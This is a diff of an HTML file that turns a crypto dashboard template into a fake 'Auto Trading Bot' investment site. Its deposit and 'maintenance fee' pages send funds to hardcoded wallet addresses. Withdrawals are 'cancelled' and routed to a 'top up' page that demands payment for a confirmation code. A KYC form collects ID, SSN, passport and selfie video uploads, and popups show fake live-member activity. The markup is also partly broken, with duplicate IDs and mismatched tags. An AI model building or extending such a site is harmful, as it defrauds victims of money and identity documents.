@@ -1,525 +1,789 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Blockchain Auto Trading Bot - 30 Pages</title>
-<style>
-  /* ===== Base styling & Reset ===== */
-  * { box-sizing: border-box; }
-  body {
-    margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: #031f4b; color: #e0e8f9;
-    transition: background-color 0.3s, color 0.3s;
-    min-height: 100vh;
-  }
-  body.dark-mode {
-    background: #021431; color: #a9b8d9;
-  }
-  a { color: #52a6ff; font-weight: 700; text-decoration: none; }
-  a:hover { text-decoration: underline; }
-
-  /* ===== Layout ===== */
-  #container {
-    display: flex; height: 100vh; overflow: hidden;
-  }
-  nav {
-    width: 260px; background: #043a94; padding: 20px 0;
-    border-right: 1px solid #052a75; overflow-y: auto;
-  }
-  nav.dark-mode {
-    background: #022060; border-color: #031743;
-  }
-  nav ul { list-style: none; padding: 0; margin: 0; }
-  nav li { margin-bottom: 10px; }
-  nav button {
-    width: 100%; background: transparent; border: none;
-    padding: 12px 24px; font-weight: 700; font-size: 14px;
-    color: #a6c8ff; text-align: left; cursor: pointer;
-    border-left: 4px solid transparent;
-    transition: background-color 0.2s, border-color 0.2s, color 0.2s;
-  }
-  nav button:hover, nav button.active {
-    background: #052a75; border-left: 4px solid #0099ff; color: #fff;
-  }
-  nav button#logoutBtn {
-    color: #ff4d4d; font-weight: 900; border-left: none;
-    margin-top: 30px; background: transparent;
-  }
-  main {
-    flex-grow: 1; overflow-y: auto; padding: 30px 40px;
-  }
-  header {
-    display: flex; justify-content: space-between; align-items: center;
-    margin-bottom: 30px;
-  }
-  header h1 {
-    margin: 0; font-weight: 900; font-size: 1.9rem; color: #59a7ff;
-  }
-
-  /* ===== Buttons ===== */
-  .btn {
-    background-color: #007bff; border: none; color: white;
-    font-weight: 700; font-size: 16px; padding: 14px 26px;
-    border-radius: 6px; cursor: pointer; transition: background-color 0.3s ease;
-    margin-top: 20px;
-  }
-  .btn:hover:not(:disabled) { background-color: #005ecb; }
-  .btn:disabled { background-color: #004a96; cursor: wait; }
-
-  /* ===== Forms ===== */
-  form {
-    max-width: 420px; margin: 0 auto;
-    background-color: #052a75; padding: 30px 28px; border-radius: 10px;
-    box-shadow: 0 0 12px rgba(0,0,0,0.4);
-  }
-  body.dark-mode form { background-color: #031d48; }
-  label {
-    display: block; font-weight: 700; margin-bottom: 8px; font-size: 14px;
-  }
-  input[type="email"], input[type="tel"], input[type="password"], input[type="text"] {
-    width: 100%; padding: 12px 14px; margin-bottom: 18px;
-    border: none; border-radius: 6px; font-size: 15px;
-  }
-
-  /* ===== Loading spinner ===== */
-  .spinner {
-    margin: 20px auto 0 auto;
-    border: 6px solid #e0e8f9;
-    border-top: 6px solid #007bff;
-    border-radius: 50%; width: 48px; height: 48px;
-    animation: spin 1s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  /* ===== Sections ===== */
-  section { display: none; }
-  section.active { display: block; }
-
-  /* ===== Coins List ===== */
-  #coins-list {
-    display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px;
-  }
-  .coin-card {
-    background: #052a75; border-radius: 10px; padding: 18px; width: 160px;
-    text-align: center; font-weight: 700;
-    box-shadow: 0 0 10px rgba(0,0,0,0.5);
-    transition: background-color 0.3s;
-  }
-  .coin-card img {
-    width: 48px; height: 48px; margin-bottom: 8px;
-  }
-  body.dark-mode .coin-card { background: #031d48; }
-
-  /* ===== Market analysis text ===== */
-  .market-analysis {
-    margin-top: 20px; background: #052a75; border-radius: 10px;
-    padding: 15px 20px; font-weight: 700; font-size: 14px;
-    box-shadow: 0 0 8px rgba(0,0,0,0.3);
-  }
-  body.dark-mode .market-analysis { background: #031d48; }
-
-  /* ===== TradingView Widget Containers ===== */
-  .tradingview-container {
-    margin-top: 30px; border-radius: 12px; overflow: hidden; height: 480px;
-  }
-
-  /* ===== Dark mode toggle ===== */
-  #darkModeToggle {
-    background: transparent; border: 2px solid #59a7ff; color: #59a7ff;
-    border-radius: 20px; padding: 8px 18px; font-weight: 700; cursor: pointer;
-    margin: 0 24px; transition: background-color 0.3s, color 0.3s;
-  }
-  #darkModeToggle:hover {
-    background-color: #59a7ff; color: #031f4b;
-  }
-
-  /* ===== Market News ===== */
-  #news-list {
-    margin-top: 20px; max-width: 900px;
-  }
-  #news-list article {
-    background: #052a75; margin-bottom: 15px; padding: 12px 18px;
-    border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.3);
-  }
-  #news-list article a {
-    color: #8cc0ff; font-weight: 700; font-size: 14px;
-  }
-  body.dark-mode #news-list article { background: #031d48; }
-
-  /* ===== Hide sidebar for auth pages ===== */
-  #sidebar.hidden { display: none; }
-
-  /* ===== Responsive ===== */
-  @media (max-width: 768px) {
-    #container { flex-direction: column; }
-    nav { width: 100%; border-right: none; border-bottom: 1px solid #052a75; }
-    main { padding: 20px; }
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Trading Bot</title>
+  <style>
+    body { background-color: #0b0f1a; color: white; font-family: sans-serif; margin: 0; padding: 0; }
+    .page { display: none; padding: 2rem; }
+    .active { display: block; }
+    .btn { padding: 0.5rem 1rem; background: #1366d9; border: none; color: white; font-weight: bold; cursor: pointer; }
+    input { padding: 0.5rem; margin: 0.5rem 0; width: 100%; }
+    .card { background: #1a2332; border-radius: 10px; padding: 1rem; margin: 1rem 0; }
+    .price-item { margin: 0.5rem 0; display: flex; align-items: center; gap: 0.5rem; }
+  </style>
 </head>
 <body>
-<div id="container">
-  <nav id="sidebar" class="dark-mode">
-    <ul id="navList">
-      <!-- Buttons generated by script -->
-    </ul>
-    <div style="padding: 10px 24px; margin-top: 30px;">
-      <button id="darkModeToggle">Toggle Dark Mode</button>
+  <!-- Sign-Up Page -->
+  <div id="signUpPage" class="page active">
+  <h2>Create Account</h2>
+  <form id="signUpForm">
+    <input name="email" placeholder="Email" required />
+    <input name="phone" placeholder="Phone Number" required />
+    <input name="password" type="password" placeholder="Password" required />
+    <button class="btn" type="submit">Register</button>
+  </form>
+</div>
+  <!-- Auth Loading Page -->
+  <div id="authPage" class="page">
+  <h2>Verifying Identity...</h2>
+  <div id="authStatusMsg">Loading...</div>
+</div>
+  <!-- Sign-In Page -->
+  <div id="signInPage" class="page">
+  <h2>Welcome Back</h2>
+  <form id="signInForm">
+    <input name="userId" placeholder="User ID" required />
+    <input name="password" type="password" placeholder="Password" required />
+    <button class="btn" type="submit">Sign In</button>
+  </form>
+</div>
+     
+<!-- PAGE 4: Main Trading Account Dashboard -->
+  <div id="dashboardPage" class="page4">
+  <h2>Dashboard
+    <span id="dashboardUserId"></span></h2>
+    Blockchain Auto-Trading Bot Dashboard
+    <span class="userIdDisplay" id="dashboardUserId"></span>
+    <button id="logoutBtnDashboard" style="background:#ff3b3b; color:#fff; padding:5px 12px; border-radius:5px; font-weight:700; margin-left:15px;">Logout</button>
+  </div>
+  <h2>Total Deposits: $<span id="dashboardTotalDeposits">0.00</span></h2>
+
+  <div class="btn-row">
+    <button id="tradeBtnDashboard" class="btn-yellow">Trade</button>
+    <button id="depositBtnDashboard" class="btn-yellow">Deposit</button>
+    <button id="withdrawBtnDashboard" class="btn-yellow">Withdraw</button>
+    <button id="detailsBtnDashboard" class="btn-yellow">Details</button>
+  </div>
+  
+  <div class="card">
+    <h3>Live Coin Prices</h3>
+    <div id="livePriceContainer"></div>
+  </div>  <div class="card">
+    <h3>Trading Chart</h3>
+    <div id="tradingviewWidget"></div>
+  </div>  <div class="card">
+    <h3>Market News</h3>
+    <div id="newsFeed"></div>
+  </div>  <div class="card">
+    <h3>Simulated Trade</h3>
+    <button class="btn" onclick="simulateTrade('BTC')">Buy BTC</button>
+    <button class="btn" onclick="simulateTrade('ETH')">Buy ETH</button>
+    <div id="tradeLog"></div>
+  </div>
+  
+  <div class="btn-row" style="margin-top: 20px;">
+    <button id="spotTradingBtn" class="btn-yellow">Spot Trading</button>
+    <button id="derivativesTradingBtn" class="btn-yellow">Derivatives Trading</button>
+  </div>
+
+  <!-- Live members popups container -->
+  <div id="membersPopupsTop" style="position: fixed; top: 10px; left: 50%; transform: translateX(-50%); color:#f0b90b; font-weight:700; z-index:10000;"></div>
+  <div id="membersPopupsBottom" style="position: fixed; bottom: 10px; left: 50%; transform: translateX(-50%); color:#f0b90b; font-weight:700; z-index:10000;"></div>
+
+</section>
+
+<!-- PAGE 5: Deposit Page -->
+<section class="page" id="page5">
+  <button class="nav-back" id="backToDashboardFromDeposit">&lt; Back</button>
+  <h2>Deposit Funds</h2>
+  <form id="depositForm">
+    <label for="depositAmount">Funding Amount (USD)</label>
+    <input type="number" id="depositAmount" min="10" step="any" placeholder="Enter amount" required />
+    <button type="submit" id="depositConfirmBtn">Confirm Deposit</button>
+  </form>
+  <div id="depositAddresses" style="margin-top:20px; display:none;">
+    <p><b>Send your funds to:</b></p>
+    <p>ETH Ethereum network address: <span id="ethDepositAddress" style="user-select: all;">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</span> <button class="copy-button" data-copy-target="ethDepositAddress">Copy</button></p>
+    <p>BNB Smart Chain BEP20 network address: <span id="bnbDepositAddress" style="user-select: all;">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</span> <button class="copy-button" data-copy-target="bnbDepositAddress">Copy</button></p>
+    <p>Tron TRC20 network address: <span id="tronDepositAddress" style="user-select: all;">TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco</span> <button class="copy-button" data-copy-target="tronDepositAddress">Copy</button></p>
+  </div>
+</section>
+
+<!-- PAGE 6: Withdraw Page -->
+<section class="page" id="page6">
+  <button class="nav-back" id="backToDashboardFromWithdraw">&lt; Back</button>
+  <h2>Withdraw Funds</h2>
+  <form id="withdrawForm">
+    <label for="withdrawAddress">Withdrawal Address</label>
+    <input type="text" id="withdrawAddress" placeholder="Enter withdrawal address" required autocomplete="off" />
+    <button type="button" id="useConnectedAddressBtn" style="margin-bottom:15px;">Use Connected Address</button>
+
+    <label for="withdrawAmount">Amount (USD)</label>
+    <input type="number" id="withdrawAmount" min="10" step="any" placeholder="Enter withdrawal amount" required />
+    <button type="button" id="maxWithdrawBtn" style="margin-bottom:15px;">MAX</button>
+
+    <label for="networkSelect">Select Network</label>
+    <select id="networkSelect" required>
+      <option value="bnb">BNB Smart Chain BEP20</option>
+      <option value="eth">Ethereum Network</option>
+      <option value="tron">Tron TRC20</option>
+    </select>
+
+    <label>Gas Fee (USD): <span id="gasFeeDisplay">0.00</span></label>
+
+    <button type="submit" id="withdrawBtn">Withdraw</button>
+  </form>
+</section>
+
+<!-- PAGE 7: Withdrawal Cancel Page -->
+<section class="page" id="page7">
+  <button class="nav-back" id="backToWithdrawCancel">&lt; Back</button>
+  <h2>Withdrawal Cancelled</h2>
+  <p id="withdrawCancelMsg" style="font-weight:bold; margin-bottom:20px;"></p>
+  <button id="proceedToTopUpBtn">Proceed to Top Up</button>
+</section>
+
+<!-- PAGE 8: Top Up Page -->
+<section class="page" id="page8">
+  <button class="nav-back" id="backToPageFromTopUp">&lt; Back</button>
+  <h2>Top Up Your Account</h2>
+  <p id="topUpAddressLabel"></p>
+  <p id="topUpAddress" style="user-select: all; font-weight:bold;"></p>
+  <button class="copy-button" id="copyTopUpAddressBtn">Copy Address</button>
+
+  <h3>Confirm Withdrawal Code</h3>
+  <form id="withdrawCodeForm">
+    <input type="text" id="withdrawCodeInput" placeholder="Enter withdrawal confirmation code" required />
+    <button type="submit">Confirm Withdrawal</button>
+  </form>
+</section>
+
+<!-- PAGE 9: Withdrawal Success Page -->
+<section class="page" id="page9">
+  <h2>Withdrawal Successful</h2>
+  <p>User Withdrawal Address: <span id="successWithdrawAddress"></span></p>
+  <p>Network: <span id="successWithdrawNetwork"></span></p>
+  <p>Withdrawal Amount: $<span id="successWithdrawAmount"></span></p>
+  <p>Time (UTC): <span id="successWithdrawTime"></span></p>
+  <button id="backToDashboardAfterWithdraw">Back to Dashboard</button>
+</section>
+
+<!-- PAGE 10: Sign In Page -->
+<section class="page" id="page10">
+  <button class="nav-back" id="backToPage1FromSignIn">&lt; Back</button>
+  <h2>Sign In</h2>
+  <form id="signInForm">
+    <label for="signInUserId">User ID</label>
+    <input type="text" id="signInUserId" required placeholder="Enter User ID" autocomplete="username" />
+    <label for="signInPassword">Password</label>
+    <input type="password" id="signInPassword" required placeholder="Enter Password" autocomplete="current-password" />
+    <button type="submit">Login</button>
+  </form>
+</section>
+
+<!-- PAGE 11: Account Details Page -->
+<section class="page" id="page11">
+  <button class="nav-back" id="backToDashboardFromDetails">&lt; Back</button>
+  <h2>Account Details</h2>
+  <button id="verifyAccountBtn" class="btn-yellow">Verify Account (KYC)</button>
+  <button id="updateProfileBtn" class="btn-yellow">Update Profile</button>
+  <button id="manualWalletConnectBtn" class="btn-yellow">Manual Wallet Connection</button>
+  <button id="directWalletConnectBtn" class="btn-yellow">Connect via Trust Wallet</button>
+  <button id="disconnectWalletBtn" class="btn-yellow">Disconnect Wallet</button>
+  <button id="logoutBtnDetails" class="btn-yellow" style="background:#ff3b3b;">Logout</button>
+</section>
+
+<!-- PAGE 12: KYC Verification Page -->
+<section class="page" id="page12">
+  <button class="nav-back" id="backToDetailsFromKYC">&lt; Back</button>
+  <h2>KYC Verification</h2>
+  <form id="kycForm" enctype="multipart/form-data">
+    <label for="kycName">Full Name</label>
+    <input type="text" id="kycName" required />
+    <label for="kycEmail">Email</label>
+    <input type="email" id="kycEmail" required />
+    <label for="kycPhone">Phone Number</label>
+    <input type="tel" id="kycPhone" required />
+    <label for="kycCountry">Country</label>
+    <select id="kycCountry" required>
+      <option value="">Select country</option>
+      <option value="US">United States</option>
+      <option value="GB">United Kingdom</option>
+      <option value="NG">Nigeria</option>
+      <option value="CA">Canada</option>
+      <option value="IN">India</option>
+      <option value="AE">United Arab Emirates</option>
+      <!-- Add more countries as needed -->
+    </select>
+
+    <label for="kycNationalID">Upload National ID</label>
+    <input type="file" id="kycNationalID" accept="image/*,application/pdf" required />
+    <label for="kycSSN">Upload Social Security Number (SSN)</label>
+    <input type="file" id="kycSSN" accept="image/*,application/pdf" required />
+    <label for="kycPassport">Upload Passport</label>
+    <input type="file" id="kycPassport" accept="image/*,application/pdf" required />
+    <label for="kycVideoSelfie">Upload Video Selfie</label>
+    <input type="file" id="kycVideoSelfie" accept="video/*" required />
+
+    <button type="submit">Submit KYC</button>
+  </form>
+</section>
+
+<!-- PAGE 12i: KYC Pending Review -->
+<section class="page" id="page12i">
+  <button class="nav-back" id="backToDetailsFromKYCPending">&lt; Back</button>
+  <h2>KYC Pending Review</h2>
+  <p>Your KYC documents have been submitted and are currently under review. Please check back later.</p>
+</section>
+
+<!-- PAGE 12ii: KYC Approved -->
+<section class="page" id="page12ii">
+  <button class="nav-back" id="backToDetailsFromKYCApproved">&lt; Back</button>
+  <h2>KYC Approved</h2>
+  <p>Congratulations! Your KYC verification has been successfully approved. You now have full access to all features.</p>
+</section>
+
+<!-- PAGE 13: Wallet Connect Page -->
+<section class="page" id="page13">
+  <button class="nav-back" id="backToDetailsFromWalletConnect">&lt; Back</button>
+  <h2>Wallet Connection</h2>
+  <p>Connect your wallet manually or via supported wallet apps.</p>
+  <form id="walletConnectForm">
+    <label for="manualWalletAddress">Enter Wallet Address (BEP20 or ETH)</label>
+    <input type="text" id="manualWalletAddress" placeholder="0x..." autocomplete="off" />
+    <button type="submit">Connect Wallet</button>
+  </form>
+  <p style="margin-top: 20px;">Or use a supported wallet app to connect.</p>
+  <button id="walletConnectTrustWalletBtn" class="btn-yellow">Connect via Trust Wallet</button>
+  <button id="walletDisconnectBtn" class="btn-yellow" style="background:#ff3b3b; margin-top:10px;">Disconnect Wallet</button>
+</section>
+
+<!-- PAGE 14: Spot Trading Page -->
+<section class="page" id="page14">
+  <button class="nav-back" id="backToDashboardFromSpot">&lt; Back</button>
+  <h2>Spot Trading</h2>
+  <div class="trading-tabs" id="spotTradingTabs">
+    <button class="active" data-tab="spotTrade">Trade</button>
+    <button data-tab="spotOrders">Orders</button>
+    <button data-tab="spotMessages">Messages</button>
+  </div>
+
+  <div id="spotTrade" class="trade-tab-content active">
+    <form id="spotTradeForm">
+      <label for="spotTradeSymbol">Symbol</label>
+      <input type="text" id="spotTradeSymbol" placeholder="e.g. BTCUSDT" required />
+      <label for="spotTradeAmount">Amount</label>
+      <input type="number" id="spotTradeAmount" min="0" step="any" placeholder="Enter amount" required />
+      <label for="spotTradeType">Order Type</label>
+      <select id="spotTradeType" required>
+        <option value="buy">Buy</option>
+        <option value="sell">Sell</option>
+      </select>
+      <button type="submit">Place Order</button>
+    </form>
+  </div>
+
+  <div id="spotOrders" class="trade-tab-content" style="display:none;">
+    <h3>Your Orders</h3>
+    <div id="spotOrdersList">No orders yet.</div>
+  </div>
+
+  <div id="spotMessages" class="trade-tab-content" style="display:none;">
+    <h3>Messages</h3>
+    <div id="spotMessagesList">No messages yet.</div>
+  </div>
+</section>
+
+
+<!-- PAGE 15: Derivatives Trading Page -->
+<section class="page" id="page15">
+  <button class="nav-back" id="backToDashboardFromDerivatives">&lt; Back</button>
+  <h2>Derivatives Trading</h2>
+  <div class="trading-tabs" id="derivativesTradingTabs">
+    <button class="active" data-tab="derivTrade">Trade</button>
+    <button data-tab="derivPositions">Positions</button>
+    <button data-tab="derivMessages">Messages</button>
+  </div>
+
+  <div id="derivTrade" class="trade-tab-content active">
+    <form id="derivTradeForm">
+      <label for="derivSymbol">Symbol</label>
+      <input type="text" id="derivSymbol" placeholder="e.g. BTCUSDT" required />
+      <label for="derivLeverage">Leverage</label>
+      <select id="derivLeverage" required>
+        <option value="1x">1x</option>
+        <option value="5x">5x</option>
+        <option value="10x">10x</option>
+        <option value="20x">20x</option>
+        <option value="50x">50x</option>
+      </select>
+      <label for="derivAmount">Amount</label>
+      <input type="number" id="derivAmount" min="0" step="any" placeholder="Enter amount" required />
+      <label for="derivType">Order Type</label>
+      <select id="derivType" required>
+        <option value="buy">Buy (Long)</option>
+        <option value="sell">Sell (Short)</option>
+      </select>
+      <button type="submit">Place Derivatives Order</button>
+    </form>
+  </div>
+
+  <div id="derivPositions" class="trade-tab-content" style="display:none;">
+    <h3>Your Open Positions</h3>
+    <div id="derivPositionsList">No open positions.</div>
+  </div>
+
+  <div id="derivMessages" class="trade-tab-content" style="display:none;">
+    <h3>Messages</h3>
+    <div id="derivMessagesList">No messages yet.</div>
+  </div>
+</section>
+
+
+<!-- Page 16: Trading Domain Main Page -->
+<div class="page" id="page16" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2 style="margin-bottom:20px;">Trading Domain</h2>
+  
+  <div style="display:flex; gap:15px; margin-bottom:15px;">
+    <button class="tab-btn active" data-tab="quotesTab" style="flex:1; background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px;">Quotes</button>
+    <button class="tab-btn" data-tab="chartsTab" style="flex:1; background:#333; color:#f0b90b; font-weight:bold; border:none; border-radius:6px; padding:12px;">Charts</button>
+    <button class="tab-btn" data-tab="tradeTab" style="flex:1; background:#333; color:#f0b90b; font-weight:bold; border:none; border-radius:6px; padding:12px;">Trade</button>
+    <button class="tab-btn" data-tab="historyTab" style="flex:1; background:#333; color:#f0b90b; font-weight:bold; border:none; border-radius:6px; padding:12px;">History</button>
+    <button class="tab-btn" data-tab="messagesTab" style="flex:1; background:#333; color:#f0b90b; font-weight:bold; border:none; border-radius:6px; padding:12px;">Messages</button>
+  </div>
+
+  <!-- Quotes Tab -->
+  <div id="quotesTab" class="trade-tab-content" style="display:block; color:#fff;">
+    <h3>Live Quotes</h3>
+    <div id="quotesList" style="overflow-y:auto; max-height:350px; border:1px solid #333; border-radius:8px; padding:10px;">
+      <!-- Live quotes inserted here dynamically -->
     </div>
-  </nav>
+  </div>
 
-  <main>
-    <!-- === Authentication Pages === -->
-    <section id="signup" aria-label="Sign Up Page">
-      <h1 style="text-align:center; font-weight:900; color:#59a7ff;">Sign Up</h1>
-      <form id="signupForm" autocomplete="off">
-        <label for="signupEmail">Email or Phone:</label>
-        <input type="text" id="signupEmail" name="signupEmail" required placeholder="Enter email or phone" autocomplete="off" />
-        <label for="signupPassword">Password:</label>
-        <input type="password" id="signupPassword" name="signupPassword" required placeholder="Enter password" autocomplete="new-password" />
-        <button type="submit" class="btn">Join</button>
-      </form>
-      <div id="signupLoading" style="display:none; text-align:center;">
-        <p style="font-weight:700; margin-top: 20px;">Processing your sign up, please wait...</p>
-        <div class="spinner"></div>
-      </div>
-    </section>
+  <!-- Charts Tab -->
+  <div id="chartsTab" class="trade-tab-content" style="display:none; color:#fff;">
+    <h3>Live Price Chart</h3>
+    <canvas id="tradeChart" style="width:100%; height:400px; background:#222; border-radius:8px;"></canvas>
+    <div style="margin-top:10px;">
+      <button id="buyBtn" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:10px 20px; margin-right:10px;">Buy</button>
+      <button id="sellBtn" style="background:#333; color:#f0b90b; font-weight:bold; border:none; border-radius:6px; padding:10px 20px;">Sell</button>
+    </div>
+  </div>
 
-    <section id="signin" aria-label="Sign In Page">
-      <h1 style="text-align:center; font-weight:900; color:#59a7ff;">Sign In</h1>
-      <form id="signinForm" autocomplete="off">
-        <label for="signinEmail">Email or Phone:</label>
-        <input type="text" id="signinEmail" name="signinEmail" required placeholder="Enter email or phone" autocomplete="off" />
-        <label for="signinPassword">Password:</label>
-        <input type="password" id="signinPassword" name="signinPassword" required placeholder="Enter password" autocomplete="current-password" />
-        <button type="submit" class="btn">Sign In</button>
-      </form>
-      <div id="signinLoading" style="display:none; text-align:center;">
-        <p style="font-weight:700; margin-top: 20px;">Signing you in, please wait...</p>
-        <div class="spinner"></div>
-      </div>
-    </section>
+  <!-- Trade Tab -->
+  <div id="tradeTab" class="trade-tab-content" style="display:none; color:#fff;">
+    <h3>Place a Trade</h3>
+    <form id="tradeForm" style="max-width:400px;">
+      <label>Total Amount ($):</label><br/>
+      <input type="number" id="tradeAmount" required min="1" style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
 
-    <!-- === 30 Pages === -->
-    <section id="page1" aria-label="Dashboard" class="active">
-      <header><h1>Dashboard Overview</h1></header>
-      <p>Welcome to your Blockchain Auto Trading Bot Dashboard.</p>
-    </section>
+      <label>Take Profit ($):</label><br/>
+      <input type="number" id="takeProfit" required min="1" style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
 
-    <section id="page2" aria-label="Top Cryptocurrencies">
-      <h2>Top Cryptocurrencies</h2>
-      <div id="coins-list"><p>Loading coins...</p></div>
-    </section>
+      <label>Stop Loss ($):</label><br/>
+      <input type="number" id="stopLoss" required min="0" style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
 
-    <section id="page3" aria-label="Market Analysis">
-      <h2>Market Analysis</h2>
-      <div class="market-analysis" id="marketAnalysisText">Loading market analysis...</div>
-    </section>
+      <label>Trade Duration (days):</label><br/>
+      <select id="tradeDuration" style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;">
+        <option value="15">15</option>
+        <option value="25">25</option>
+        <option value="30">30</option>
+        <option value="35">35</option>
+        <option value="40">40</option>
+        <option value="45">45</option>
+        <option value="50">50</option>
+        <option value="55">55</option>
+        <option value="60">60</option>
+        <option value="65">65</option>
+        <option value="70">70</option>
+        <option value="75">75</option>
+        <option value="80">80</option>
+        <option value="85">85</option>
+        <option value="90">90</option>
+        <option value="95">95</option>
+        <option value="100">100</option>
+      </select>
 
-    <section id="page4" aria-label="Live Market Charts">
-      <h2>Live Market Charts</h2>
-      <div id="tradingview-widget" class="tradingview-container"></div>
-    </section>
+      <button type="submit" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Activate Trade</button>
+    </form>
+  </div>
 
-    <section id="page5" aria-label="Market News">
-      <h2>Latest Market News</h2>
-      <div id="news-list"><p>Loading news...</p></div>
-    </section>
+  <!-- History Tab -->
+  <div id="historyTab" class="trade-tab-content" style="display:none; color:#fff;">
+    <h3>Trade History</h3>
+    <div id="tradeHistoryList" style="max-height:350px; overflow-y:auto; border:1px solid #333; border-radius:8px; padding:10px;">
+      <!-- History will be dynamically loaded here -->
+    </div>
+  </div>
 
-    <section id="page6" aria-label="Coins Performance">
-      <h2>Coins Live Performance</h2>
-      <div id="performance-charts"><p>Loading performance charts...</p></div>
-    </section>
+  <!-- Messages Tab -->
+  <div id="messagesTab" class="trade-tab-content" style="display:none; color:#fff;">
+    <h3>Messages</h3>
+    <div id="messagesList" style="max-height:350px; overflow-y:auto; border:1px solid #333; border-radius:8px; padding:10px;">
+      <!-- Messages and notifications here -->
+    </div>
+  </div>
 
-    <section id="page7" aria-label="Trading Charts">
-      <h2>Live Trading Charts</h2>
-      <div id="trading-charts-container" class="tradingview-container"></div>
-    </section>
-
-    <!-- Pages 8 - 30 placeholders -->
-    <script>
-      for(let i=8; i<=30; i++){
-        document.write(`
-          <section id="page${i}" aria-label="Page ${i}">
-            <h2>Page ${i}</h2>
-            <p>This is placeholder content for page ${i}. Customize as needed.</p>
-          </section>
-        `);
-      }
-    </script>
-  </main>
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">&lt; Back to Dashboard</button>
 </div>
 
-<script>
-  // ===== Navigation Setup =====
-  const navList = document.getElementById('navList');
-  // Generate nav buttons for pages 1-30
-  for(let i=1; i<=30; i++){
-    const li = document.createElement('li');
-    const btn = document.createElement('button');
-    btn.textContent = i === 1 ? 'Dashboard' : `Page ${i}`;
-    btn.setAttribute('data-page', `page${i}`);
-    if(i === 1) btn.classList.add('active');
-    li.appendChild(btn);
-    navList.appendChild(li);
-  }
-  // Add logout button
-  const logoutLi = document.createElement('li');
-  const logoutBtn = document.createElement('button');
-  logoutBtn.id = 'logoutBtn';
-  logoutBtn.textContent = 'Logout';
-  logoutLi.appendChild(logoutBtn);
-  navList.appendChild(logoutLi);
+<!-- Page 16i: Maintenance Warning Page -->
+<div class="page" id="page16i" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Account Maintenance Warning</h2>
+  <p>Your trading account maintenance fee is due in 5 days.</p>
+  <p>Please pay the maintenance fee to continue uninterrupted trading.</p>
+  <button id="confirmMaintenanceBtn" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px;">Confirm Maintenance Payment</button>
+  <button onclick="showPage('page4')" style="margin-left:10px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
 
-  // ===== Page State Management =====
-  const sidebar = document.getElementById('sidebar');
-  const pages = {};
-  for(let i=1; i<=30; i++) {
-    pages[`page${i}`] = document.getElementById(`page${i}`);
-  }
-  const signup = document.getElementById('signup');
-  const signin = document.getElementById('signin');
+<!-- Page 16ii: Maintenance Payment Page -->
+<div class="page" id="page16ii" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Pay Maintenance Fee</h2>
+  <p>Send your maintenance fee to one of the following addresses:</p>
+  <div style="margin-bottom:15px;">
+    <div><strong>ETH Address:</strong> 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="copyBtn" data-copy="eth">Copy</button></div>
+    <div><strong>BNB BEP20 Address:</strong> 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="copyBtn" data-copy="bnb">Copy</button></div>
+  </div>
+  <label>Enter Maintenance Code:</label>
+  <input type="text" id="maintenanceCodeInput" placeholder="Enter maintenance validation code" style="width:100%; padding:8px; margin-bottom:15px; border-radius:6px; border:none;"/>
+  <button id="submitMaintenanceCode" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Validate Code</button>
+  <button onclick="showPage('page4')" style="margin-top:10px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
 
-  // Helper: Hide all pages
-  function hideAllPages() {
-    Object.values(pages).forEach(p => p.classList.remove('active'));
-    signup.classList.remove('active');
-    signin.classList.remove('active');
+<!-- Page 17: Spot Trading Page -->
+<div class="page" id="page17" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Spot Trading</h2>
+  <canvas id="spotTradingChart" style="width:100%; height:400px; background:#222; border-radius:8px; margin-bottom:20px;"></canvas>
+  <form id="spotTradingForm" style="max-width:400px;">
+    <label>Symbol (e.g. BTC, ETH):</label><br/>
+    <input type="text" id="spotTradeSymbol" name="spotTradeSymbol" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
+    <label>Amount:</label><br/>
+    <input type="number" id="spotTradeAmount" name="spotTradeAmount" required min="0.01" step="0.01" style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
+    <label>Trade Type:</label><br/>
+    <select id="spotTradeType" name="spotTradeType" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;">
+      <option value="buy">Buy</option>
+      <option value="sell">Sell</option>
+    </select>
+    <button type="submit" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Place Order</button>
+  </form>
+  <h3>Orders</h3>
+  <div id="spotOrdersList" style="max-height:300px; overflow-y:auto; border:1px solid #333; border-radius:8px; padding:10px; background:#111;"></div>
